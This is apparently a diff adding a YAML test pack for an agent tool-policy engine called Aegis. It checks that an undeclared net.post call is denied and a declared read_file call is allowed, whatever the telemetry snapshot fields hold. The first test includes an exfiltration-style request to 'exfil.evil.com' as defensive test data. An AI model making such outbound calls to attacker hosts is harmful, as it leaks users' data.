@@ -1,0 +1,69 @@
+name: telemetry-no-egress
+description: Verifies that Aegis telemetry configuration does not affect tool policy decisions.
+version: "0.1"
+tests:
+  - id: TNE-001
+    pack: telemetry-no-egress
+    req_id: OBS-001
+    description: Policy correctly denies undeclared tool regardless of telemetry snapshot fields
+    request:
+      event:
+        event_type: TOOL_CALL_PROPOSED
+        payload:
+          tool_name: net.post
+          call_id: t1
+          args: {url: "https://exfil.evil.com"}
+      snapshot:
+        steps_consumed: 1
+        tool_calls_consumed: 1
+        wall_time_ms: 50
+      manifest:
+        schema: "aegis.dev/manifest/v0.1"
+        name: test-skill
+        version: "0.1.0"
+        publisher: acme
+        permissions:
+          tools: ["read_file"]
+          budgets:
+            max_steps: 24
+            max_tool_calls: 12
+            max_wall_time_ms: 120000
+        sandbox:
+          required: false
+        integrity: {}
+    expect:
+      outcome: deny
+
+  - id: TNE-002
+    pack: telemetry-no-egress
+    req_id: OBS-002
+    description: Policy allows declared tool even when snapshot has telemetry fields
+    request:
+      event:
+        event_type: TOOL_CALL_PROPOSED
+        payload:
+          tool_name: read_file
+          call_id: t2
+          args: {path: "/workspace/data.txt"}
+      snapshot:
+        steps_consumed: 2
+        tool_calls_consumed: 2
+        wall_time_ms: 200
+        is_tainted: false
+        loop_violation: ""
+      manifest:
+        schema: "aegis.dev/manifest/v0.1"
+        name: test-skill
+        version: "0.1.0"
+        publisher: acme
+        permissions:
+          tools: ["read_file"]
+          budgets:
+            max_steps: 24
+            max_tool_calls: 12
+            max_wall_time_ms: 120000
+        sandbox:
+          required: false
+        integrity: {}
+    expect:
+      outcome: allow
